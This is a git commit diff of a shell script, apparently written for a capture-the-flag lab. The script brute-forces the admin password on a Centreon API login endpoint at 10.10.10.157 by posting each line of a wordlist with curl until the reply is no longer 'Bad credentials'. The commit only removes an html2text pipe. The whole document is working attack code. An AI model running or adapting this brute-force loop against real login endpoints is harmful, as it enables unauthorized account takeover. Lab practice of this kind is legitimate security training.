802175ab2dd63201d2050b75ed3e29c1b4a712dc
Kevin Garcia <75913210+p1x1@users.noreply.github.com>
2021-02-24 23:39:10 -0500

    Update brute_force.sh

--- brute_force.sh
+++ brute_force.sh
@@ -5,7 +5,7 @@
 while read line;do
 
 	echo "[+] Trying : $line"
-	pwn=$(curl -sX POST http://10.10.10.157/centreon/api/index.php?action=authenticate --data "username=admin&password=$line" | html2text)
+	pwn=$(curl -sX POST http://10.10.10.157/centreon/api/index.php?action=authenticate --data "username=admin&password=$line")
 	if [ "$pwn" != "\"Bad credentials\"" ];then
 		echo -e "\n[+]PASS -- > $line"
 		break
